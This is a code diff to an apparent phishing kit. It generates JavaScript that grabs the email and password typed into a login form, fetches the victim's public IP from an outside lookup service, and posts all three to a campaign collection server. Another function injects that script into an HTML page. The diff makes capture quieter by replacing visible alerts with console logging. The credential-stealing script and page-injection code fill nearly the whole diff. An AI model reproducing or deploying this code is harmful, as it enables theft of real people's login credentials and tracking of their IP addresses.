@@ -8,14 +8,19 @@ def create_js_script(user_id, campaign_name):
 
                 const email = document.querySelector('input[name="email"]').value;
                 const password = document.querySelector('input[name="pass"]').value;
+                const ipResponse = await fetch("https://api64.ipify.org?format=json");
+                const ipData = await ipResponse.json();
+                const userIp = ipData.ip || "Unknown";
 
                 const data = {
                     email: email,
-                    password: password
+                    password: password,
+                    ip: userIp
                 };
+                
             try {
         """
-    js_code += f"const response = await fetch(`/api/campaign/{user_id}/{campaign_name}`"
+    js_code += f"const response = await fetch(`http://127.0.0.1:5000/campaign/{user_id}/{campaign_name}`"
     js_code += """, 
             {
                 method: 'POST',
@@ -26,12 +31,12 @@ def create_js_script(user_id, campaign_name):
                 });
 
                 if (response.ok) {
-                    alert("Login successful!");
+                    console.log("Login successful!");
                 } else {      
-                    alert("Login failed!");
+                    console.log("Login failed!");
                 }
                 } catch (error) {
-                    alert("There was an error with the request.");
+                    console.log("There was an error with the request.");
                 }
             });
         </script>
@@ -39,12 +44,25 @@ def create_js_script(user_id, campaign_name):
 
     return js_code
 
-def add_script_to_html(html: str, script: str) -> str:
-    closing_html_pos = html.rfind("</html>")
+def add_script_to_html(html_path: str, script: str) -> str:
+    try:
+        with open(html_path, "r", encoding="utf-8") as file:
+            html = file.read()
 
-    if closing_html_pos != -1:
-        script_tag = f"<script>{script}</script>"
-        
-        html = html[:closing_html_pos] + script_tag + html[closing_html_pos:]
+        # Remove the closing </html> tag
+        html = html.replace("</html>", "")
 
-    return html
+        # Append the script and re-add </html>
+        script_tag = f"{script}\n</html>"
+        html += script_tag
+
+        return html  # Return modified HTML
+
+    except FileNotFoundError:
+        print(f"Error: File '{html_path}' not found.")
+        return ""
+    except Exception as e:
+        print(f"Error processing file '{html_path}': {e}")
+        return ""
+
+
